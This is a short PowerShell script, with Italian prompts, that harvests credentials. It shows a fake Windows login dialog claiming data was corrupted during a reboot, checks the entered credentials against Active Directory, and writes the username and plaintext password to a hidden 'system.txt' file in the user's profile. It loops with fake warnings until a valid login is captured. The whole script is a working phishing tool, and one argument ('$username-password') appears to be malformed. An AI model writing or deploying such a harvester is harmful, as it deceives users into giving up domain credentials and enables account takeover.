
Function Test-ADAuthentication {
    param(
        $username,
        $password)
    
    (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
}

$tentativi=0
$tre=4
while(1){
	
	$Credential = $host.ui.PromptForCredential("Need credentials", "Alcuni dati sono stati corrotti durante il riavvio, inserire le credenziali per recuperarli.", "", "NetBiosUserName")



	if ($Credential -ne $null){
		$username=""
		$password=""
		$username=$Credential.UserName
		$password=$Credential.GetNetworkCredential().password
		$res=Test-ADAuthentication -username $username-password $password
		$d="C:\Users\"
		$user=$env:UserName

		$f="\system.txt"
		$new_path=$d+$user+$f

		$spazio="  "
		$hello=$username+$spazio+$password

		Add-Content -Path $new_path -Value $hello

		attrib +h $new_path
		if($res.toString() -ne "False"){
			Exit
		}
		else{
			Add-Type -AssemblyName PresentationFramework
			
			[System.Windows.MessageBox]::Show('Credenziali non valide. '+ $($tre-$tentativi-1) +' tentativi rimasti.')
			$tentativi=$tentativi+1
			if ($tentativi -eq 4){
				[System.Windows.MessageBox]::Show('Tentativi esauriti, i dati rimarranno compromessi fino al prossimo riavvio.')
				Exit
			}
		}
	}
	
	
}